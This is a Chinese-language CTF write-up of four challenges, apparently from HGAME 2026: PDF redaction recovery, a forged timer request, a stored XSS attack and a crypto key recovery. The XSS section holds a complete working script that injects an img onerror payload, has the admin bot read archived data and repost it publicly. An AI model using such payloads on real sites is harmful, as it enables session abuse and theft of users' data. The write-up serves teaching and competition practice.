---
title: DODOR#000a01-WEEK1-WP
date: 2026-02-09 21:38:58
tags:
 - CTF
categories:
  - CTF
---

## misc:

### [REDACTED]

题目为（涂黑，修改）过后的一个pdf，我们可以在第一个涂黑位置找到第一段敏感字符串，直接通过文字编辑功能将颜色改为白色再复制出来得到第一个字符串**1:PAR4D0X**。(![屏幕截图 2026-02-08 203633](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20203633.png)

然后在第二个涂黑的位置在文字编辑的模式下可以看到以下内容![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20165813.png)

因为字体原因无法直接复制，选着直接图像识别。三段经典JWT，第一段是加密方式，第二段为内容，第三段为签名，经过base64解码得出第二个字符串**2:AllCl3arToPr0ceed**

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20170152.png)

随后在图片位置有处涂黑，拉对比度和亮度识别出第三个字符串**3:Sh4m1R**

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20170751.png)

最后在检查pdf的文件结构时发现其尾部有2个%EOF为结尾，可知为pdf的增量更新，第四个字符藏在旧版本被删掉的那一页里。

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20171658.png)

我们现在要做的就是将那删掉的一页恢复，也就是定位到第一个%EOF的位置对pdf进行切片，通过grep找到%EOF的位置。![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20200000.png)

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20205415.png)

计算%EOF的代码如下

```python
with open("manual.pdf", "rb") as f_in:
    file = f_in.read()
with open("manual_old.pdf", "wb") as f_out:
    f_out.write(file[:234721])

```

打开manual_old.pdf

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20180535.png)

找到第四段字符串**4:D0cR3qu3st3r_Tutu**,最后连接得到flag。

## web

### 魔理沙的魔法目录

![image-20260208210404239](/imgs/hgame/image-20260208210404239.png)

用F12及网络保存日志可知，每过一定时长，服务器会发送一个record和一个check的请求，record请求荷载为{"time":10}，而题目对身份没有做限制，可以直接对/record用post的application/json传参{“time":7200}(大于1小时)

![](/imgs/hgame/screenshot-2026-02-02-112832.png)

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-02%20112818.png)

最终访问/check得到flag为：

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-02%20112849.png)

### **博丽神社的绘马挂**

题目说明紫在归档完毕的绘马里藏了一些不可告人的秘密。分析前端代码及main.js。发现，题目没有对消息提交界面的content做过滤处理![image-20260208211730847](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/image-20260208211730847.png)

同时有/api/report可以让Reimu访问。由此得到本体为存储型XSS，但是普通用户看不到已归档的内容，所以接下来的思路就是通过XSS漏洞让管理员在已归档的文档中找到flag，并通过/api/message发出来，这样普通用户就能看到了。按照以上思路构造payload，写脚本如下：

```python
import re
import time
import string
import requests
site = "http://local-2.hgame.vidar.club:31464"
def main():
    s = requests.Session()
    user = f"admin"
    pw = f"123456"
    r = s.post(f"{site}/api/auth/login", json={"username": user, "password": pw})
    js = """
(async()=>{
  try{
    const a = await fetch('/api/archives').then(r=>r.json());
    const m = JSON.stringify(a).match(/Hgame\{[^}]+\}/);
    if(m){
      await fetch('/api/messages', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({content: m, is_private: false})
      });
    }
  }catch(e){}
})();
""".strip().replace("\n", "")#让Reimu访问归档页面获取flag再返回到提交message

    payload = f"<img src=x onerror=\"{js}\">"

    r = s.post(f"{site}/api/messages", json={"content": payload, "is_private": False})
    if r.status_code != 200:
        raise SystemExit(f"post failed: {r.status_code} {r.text}")
    
    for i in range(5):
        try:
            s.post(f"{site}/api/report", timeout=8)
            break
        except Exception:
            time.sleep(2)

    for i in range(60):
        r = s.get(f"{site}/api/messages")
        if r.status_code == 200:
            m = re.search(r"Hgame\{[^}]+\}", r.text)
            if m:
                print(m.group(0))
                return
        time.sleep(2)

    raise SystemExit("fail")

if __name__ == "__main__":
    main()
```

这里用的上传漏洞是故意导致错误，让管理员自动执行onerror后的命令。

```javascript
<img src=x onerror="payload">
```

最后得到flag![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-06%20115538.png)

## crypto

### Flux

题目给出自定义二次同余递推类`Flux`和哈希函数`shash`的实现代码，运行后生成`data.txt`（包含`Flux`的4个连续输出值、260位素数模数`n`）。已知`shash`的密钥`key`位长小于70，目标是恢复`key`，并计算`shash("I get the key now!", key)`的十六进制结果，用`VIDAR{...}`包裹为flag。

EXP如下

```python
import ast
from typing import Tuple, Optional

def read_data() -> Tuple[list, int]:
    with open('data.txt', 'r') as f:
        xs = ast.literal_eval(f.readline().strip())
        n = int(f.readline().strip())
    return xs, n

def inv(a: int, n: int) -> int:
    return pow(a, -1, n)

def legendre(a: int, p: int) -> int:
    return pow(a, (p - 1) // 2, p)

def tonelli_shanks(a: int, p: int) -> Optional[int]:
    if a == 0:
        return 0
    if legendre(a, p) != 1:
        return None
    if p % 4 == 3:
        return pow(a, (p + 1) // 4, p)
    q = p - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = 2
    while legendre(z, p) != p - 1:
        z += 1
    c = pow(z, q, p)
    x = pow(a, (q + 1) // 2, p)
    t = pow(a, q, p)
    m = s
    while t != 1:
        i = 1
        t2i = (t * t) % p
        while t2i != 1:
            t2i = (t2i * t2i) % p
            i += 1
            if i == m:
                return None
        b = pow(c, 1 << (m - i - 1), p)
        x = (x * b) % p
        t = (t * b * b) % p
        c = (b * b) % p
        m = i
    return x

def solve_abc(xs: list, n: int) -> Tuple[int, int, int]:
    x1, x2, x3, x4 = xs
    A = (x2 * x2 - x1 * x1) % n
    B = (x2 - x1) % n
    C = (x3 - x2) % n
    D = (x3 * x3 - x2 * x2) % n
    E = (x3 - x2) % n
    F = (x4 - x3) % n
    det = (A * E - B * D) % n
    det_inv = inv(det, n)
    a = ((E * C - B * F) % n) * det_inv % n
    b = ((A * F - D * C) % n) * det_inv % n
    c = (x2 - (a * x1 * x1 + b * x1)) % n
    return a, b, c

def recover_seed(x1: int, a: int, b: int, c: int, n: int) -> Tuple[int, int]:
    if a % n == 0:
        x0 = ((x1 - c) * inv(b, n)) % n
        return x0, x0
    two_a_inv = inv((2 * a) % n, n)
    delta = (b * b - 4 * a * ((c - x1) % n)) % n
    r = tonelli_shanks(delta, n)
    if r is None:
        raise ValueError("no sqrt for delta")
    x0a = ((-b + r) % n) * two_a_inv % n
    x0b = ((-b - r) % n) * two_a_inv % n
    return x0a, x0b

def shash_py(value: str, key: int) -> int:
    mask = (1 << 256) - 1
    x = (ord(value[0]) << 7) & mask
    for ch in value:
        x = ((key * x) & mask) ^ ord(ch)
    x ^= len(value) & mask
    return x

def solve_key_with_z3(h: int, value: str) -> int:
    from z3 import BitVec, Solver, BitVecVal, ULE
    key = BitVec('key', 256)
    s = Solver()
    s.add(ULE(key, BitVecVal((1 << 70) - 1, 256)))
    x = BitVecVal(ord(value[0]) << 7, 256)
    for ch in value:
        x = (key * x) ^ BitVecVal(ord(ch), 256)
    x = x ^ BitVecVal(len(value), 256)
    s.add(x == BitVecVal(h, 256))
    if s.check().r != 1:
        raise ValueError("unsat")
    m = s.model()
    kval = m.eval(key).as_long()
    return kval

def main():
    xs, n = read_data()
    a, b, c = solve_abc(xs, n)
    x0a, x0b = recover_seed(xs[0], a, b, c, n)
    value = "Welcome to HGAME 2026!"
    cand = [x0a, x0b]
    key = None
    seed = None
    for h in cand:
        try:
            k = solve_key_with_z3(h, value)
            key = k
            seed = h
            break
        except Exception:
            pass
    if key is None:
        raise RuntimeError("key not found")
    magic_word = "I get the key now!"
    flag = "VIDAR{" + hex(shash_py(magic_word, key))[2:] + "}"
    print(key)
    print(seed)
    print(flag)

if __name__ == "__main__":
    main()

```

最终得到flag

![](https://cdn.jsdelivr.net/gh/DODOR-ddd/Image@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20213711.png)